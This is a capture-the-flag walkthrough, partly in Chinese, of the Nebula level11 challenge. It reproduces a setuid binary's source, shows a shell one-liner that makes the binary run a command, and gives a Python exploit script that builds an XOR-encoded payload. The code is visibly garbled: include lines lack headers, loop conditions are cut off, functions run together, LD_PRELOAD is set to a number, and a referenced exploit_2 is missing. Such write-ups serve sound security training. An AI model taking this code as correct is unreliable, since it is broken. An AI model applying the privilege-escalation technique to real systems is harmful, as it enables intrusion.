# level11
#### About
The /home/flag11/flag11 binary processes standard input and executes a shell command. 
There are two ways of completing this level, you may wish to do both :-) 
To do this level, log in as the level11 account with the password level11. Files for this level can be found in /home/flag11. 
#### Sources
```
#include 
#include 
#include 
#include 
#include 
#include 
#include 
/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */
int getrand(char **path)
{
	char *tmp;
	int pid;
	int fd;
	srandom(time(NULL));
	tmp = getenv("TEMP");
	pid = getpid();
	asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid, 
		'A' + (random() % 26), '0' + (random() % 10), 
		'a' + (random() % 26), 'A' + (random() % 26),
		'0' + (random() % 10), 'a' + (random() % 26));
	fd = open(*path, O_CREAT|O_RDWR, 0600);
	unlink(*path);
	return fd;
}
void process(char *buffer, int length)
{
	unsigned int key;
	int i;
	key = length & 0xff;
	for(i = 0; i  0) {
			printf("blue = %d, length = %d, ", blue, length);
			pink = fread(buf, 1, sizeof(buf), stdin);
			printf("pink = %d\n", pink);
			if(pink  %s    key: %s" % (s, d, key)
    return "".join(ret)
def de_process(buffer_, length):
    '''level11 -- decode function process'''
    key = length & 0xff
    ret = []
    for s in buffer_:
        _char = ord(s)
        _char ^= key
        d = _char & 0xff
        d = chr(d)
        key -= (_char ^ key)
        ret.append(d)
        # print "%s --> %s    key: %s" % (s, d, key)
    return "".join(ret)
```
传入单个字符b，会被转码为c*(*代表其他字符)，
由于缓冲区未被初始化为00，导致转换输出的内容后面包含其他字符.测试如下: 
##### 方案一. length  ####
系统成功执行命令，但用户身份不对。网上说法: system() 函数调用时，未做相关的权限操作。
level11@nebula:/tmp$ echo -ne 'Content-Length: 1\nb' | /home/flag11/flag11 
uid=1012(level11) gid=1012(level11) groups=1012(level11)
```
##### 方案二. length >= 1024
```
详见代码: exploit_2
Recommends
http://uberskill.blogspot.com/2012/09/nebula-level11.html
http://github.com/1u4nx/Exploit-Exercises-Nebula/
http://v0ids3curity.blogspot.com/2012/12/exploit-exercise-level-11.html
http://hanjc.me/blog/2014/01/26/nebula-level11/
http://cybergibbons.com/security-2/nebula-walkthrough/nebula-exploit-exercises-walkthrough-level11/
http://stackoverflow.com/questions/16258830/does-system-syscall-drop-privileges
Exploits
攻击代码如下: 
#!/usr/bin/env python
# -*- encoding: utf-8 -*-
import os
'''
void process(char *buffer, int length)
{
        unsigned int key;
        int i;
        key = length & 0xff;
        for(i = 0; i  %s    key: %s" % (s, d, key)
    return "".join(ret)
def de_process(buffer_, length):
    '''level11 -- decode function process'''
    key = length & 0xff
    ret = []
    for s in buffer_:
        _char = ord(s)
        _char ^= key
        d = _char & 0xff
        d = chr(d)
        key -= (_char ^ key)
        ret.append(d)
        # print "%s --> %s    key: %s" % (s, d, key)
    return "".join(ret)
def exploit_1(cmd):
    '''input = 1024'''
    _i = 's' + '\00' * 1023
    length = len(_i)
    ret = process(_i, length)
    cmds = ['export TEMP=/tmp;',
            'export LD_PRELOAD=%s' % (length)]
    [os.system(c) for c in cmds]
    payload = "Content-Length: %d\n%s\00" % (length, ret)
    print payload
if __name__ == "__main__":
    exploit_1("/usr/bin/id")
    # exploit_2("/usr/bin/id")
```